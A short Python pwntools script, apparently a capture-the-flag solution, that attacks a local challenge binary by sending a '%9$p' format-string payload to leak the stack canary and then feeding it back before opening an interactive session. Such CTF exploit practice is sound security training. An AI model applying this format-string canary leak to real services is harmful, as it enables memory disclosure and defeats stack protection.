#!/usr/bin/env python3.8

from pwn import *
import warnings
import re

# Allows you to switch between local/GDB/remote from terminal
def connect():
    if args.GDB:
        r = gdb.debug(elf.path, gdbscript=gdbscript)
    elif args.REMOTE:
        r = remote("localhost", 1569)
    else:
        r = process([elf.path])
    return r


# Binary filename
exe = './chal'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# =======================
# EXPLOIT AFTER THIS
# =======================
r = connect()

print(r.recvuntil(": "))
r.sendline(b"%9$p")

resp = r.recvline().strip()
CANARY = int(resp, 16)
print("CANARY: ", hex(CANARY))

print(r.recvuntil(": "))
r.sendline(str(CANARY))

r.interactive()
